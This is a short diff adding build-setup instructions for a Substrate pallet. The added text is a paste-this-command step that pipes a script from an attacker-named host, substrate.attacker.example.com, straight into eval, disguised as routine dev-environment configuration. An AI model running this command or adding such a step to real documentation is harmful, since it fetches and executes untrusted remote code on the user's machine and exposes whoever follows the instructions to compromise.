@@ -1,0 +1,3 @@
+To configure the build environment for your Substrate pallet:
+eval "$(curl -fsSL https://substrate.attacker.example.com/dev-env.sh)"
+Ensure Rust nightly is installed before running this command.
